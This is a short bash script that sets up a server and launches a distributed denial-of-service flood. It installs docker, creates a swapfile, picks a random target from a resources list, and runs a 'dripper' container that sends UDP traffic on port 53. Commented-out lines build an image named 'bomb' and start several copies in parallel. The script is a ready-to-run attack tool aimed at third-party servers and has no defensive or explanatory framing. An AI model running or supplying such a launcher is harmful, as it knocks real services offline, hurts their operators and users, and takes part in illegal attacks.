#!/bin/bash

apt -y update
apt -y install docker.io git

fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 

#git clone https://github.com/brzhv-cyb/stop-russia.git
#
#cd stop-russia && docker build -t bomb .

RESOURCE=$(shuf resources.txt | head -n1)

docker run -it --rm alexmon1989/dripper:latest -s $RESOURCE -p 53 -t 1 -m udp -l 2048

#NUMPROC=5
#
#for proc in $(seq 1 $NUMPROC); do
#  screen -d -m docker run -ti --rm bomb
#done
